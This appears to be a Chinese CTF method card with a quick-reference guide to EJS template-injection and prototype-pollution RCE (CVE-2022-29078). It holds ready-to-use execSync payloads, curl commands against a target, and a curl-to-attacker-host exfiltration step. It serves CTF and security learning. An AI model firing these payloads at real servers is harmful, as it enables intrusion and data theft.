---
title: 方法卡 · EJS 模板注入与原型污染 RCE（无脚本，payload 速查）
category: web
tags: [方法卡, ejs, express, 原型链污染, outputFunctionName, cve-2022-29078, rce]
signals: [app.js 用 res.render, req.query 传入 render, ejs 模板, express 应用, 版本 ejs<3.1.7, 能改 query 参数]
difficulty: medium
source: kb/web/nodejs-prototype-pollution.md
tools: [burpsuite, node, ejs]
updated: 2026-11-02
---

# 方法卡 · EJS 模板注入与原型污染 RCE（无脚本速查卡）

## 适用场景

给了 Node.js/Express 源码，典型写法是

```js
app.get('/', (req, res) => res.render('index', req.query));   // ← 致命一行
```

用 `ejs` 渲染，版本 `< 3.1.7`（CVE-2022-29078）或允许 `opts` 被污染。
目标是把 `settings['view options']` 或 `outputFunctionName` 塞进 `opts`，让 EJS 编译出的函数里
被注入一段 JS，从而执行 `child_process`。

## 前置条件

- 能控制传给 `render` 的 options（`req.query`、`req.body`，或某个 `merge` 的目标对象）。
- `ejs` 版本受漏洞影响：`outputFunctionName` 注入在 3.1.6 及以下有效。
- 服务端能读到命令输出（回显、写文件、外带 DNS/HTTP）——否则要构造盲打链。

## 步骤

1. 看 `package.json` 的 `ejs` 版本与 app 里 `render` 的调用方式，确认 options 是否可控。
2. 先做**无害探测**：`?settings[view options][outputFunctionName]=x` 观察是否 500 或行为变化。
3. 注入命令：`?settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('id');x`
4. 需要外带时把 `id` 换成 `curl http://your-host/$(whoami)`，或用 `opts.shell` 改变命令解释器。
5. 若只污染了 `Object.prototype`（例如经由 `merge`），可改污染 `settings['view options']` 整段、
   或用 `prepended`/`opts.delimiter` 之类的旁路。

**核心 payload（复制即用）：**

```
?settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('cat /flag');x
```

备选（无 `process.mainModule` 时）：

```
?settings[view options][outputFunctionName]=x;global.process.mainModule.require('child_process').execSync('id');x
?settings[view options][client]=false&settings[view options][debug]=true
```

原型污染侧写入（当 query 解析器支持 `__proto__` 时）：

```
{"__proto__":{"settings":{"view options":{"outputFunctionName":"x;1;x"}}}}
```

## 立即可用脚本

**本卡无配套脚本**（原因见文末「本卡为什么没有脚本」）。执行侧直接用 Burp Repeater / curl 打目标：

```powershell
# 探测（无害）：看是否 500 或渲染行为变化
curl.exe -s -o - "http://TARGET/?settings%5Bview%20options%5D%5BoutputFunctionName%5D=x"

# 注入命令（把 cat /flag 换成目标需要的命令）
curl.exe -s -o - "http://TARGET/?settings%5Bview%20options%5D%5BoutputFunctionName%5D=x;process.mainModule.require('child_process').execSync('cat%20/flag');x"
```

## 手工示例

本地复现（只用于验证链是否成立，不连外网）：

```powershell
npm i express ejs@3.1.6
node -e "const e=require('express')();const r=require('ejs');console.log(typeof r.renderFile)"
# 启动 vulnerable app 后：
curl "http://127.0.0.1:3000/?settings%5Bview%20options%5D%5BoutputFunctionName%5D=x;1;x"
```

漏洞版输出里会出现编译失败/异常堆栈（说明注入进了生成函数）；
修复版（ejs >= 3.1.7）会直接忽略该选项，页面正常渲染。

## 失效场景

- **ejs >= 3.1.7**：`outputFunctionName` 已被 sanitize；需要另找污染点（`escapeFunction`、`localsName` 同样受限）。
- **`render` 只传受控变量**（如 `res.render('index', {msg: req.query.msg})`）：query 进不了 options，链条断裂。
- **query 解析器不开嵌套**（Express 5 默认 `query parser: simple`）：`a[b][c]` 不再解析成对象，改从 JSON body 打。
- **服务端无回显且出网被封**：只能盲打（写文件到静态目录、DNS 外带），成功率取决于环境。
- **目标不是 EJS**（Pug/Handlebars）：转 `kb/web/ssti-template-injection.md`。

## 相关文档

- `kb/web/nodejs-prototype-pollution.md`（污染点识别、`__proto__`/`constructor.prototype` 绕过、EJS 利用段）
- `kb/_des/cards/web/CTF_中的_EJS_漏洞筆記.full.md`（EJS CTF 2023 原始 writeup：`res.render('index', req.query)` + `settings['view options']` 链）
- `kb/web/ssti-template-injection.md`（通用 SSTI 识别与回显）
- `kb/web/command-injection.md`（拿到 RCE 后的回显与外带技巧）
- `kb/_imported_cats/web/NewStar CTF 2025 _ 小 W 和小 K 的故事（最终章）__official-901500bbdce8671a2663b7.md`（同类污染链题）
- `kb/_des/wp_summary/web/Nodejs-Nodejs原型链污染.md`（原型污染总结）

## 本卡为什么没有脚本

EJS 的利用**完全依赖目标运行时**（Node 版本、query 解析器、出网能力、回显方式），
本地无法用纯 Python 复现"同一份 payload 打穿靶机"，硬造一个自检脚本只会变成"验证 payload 字符串拼对了"，
对实战没有增量。真正通用的部分是 **payload 字符串 + 识别信号**，因此本卡只给速查内容，
执行侧请直接用 Burp Repeater / curl 打目标。

## 目录与收录说明

本卡直接放在 `kb/_methods/` 下、文件名不带下划线前缀，是为了同时满足两件事：
`tools/kb/parser.py` 的 `iter_md_paths` 会跳过名字以 `_` 开头的文件（脚本目录 `scripts/` 不受影响），
而这些方法卡需要在 `python tools/cli.py index` 之后能被正常检索到。
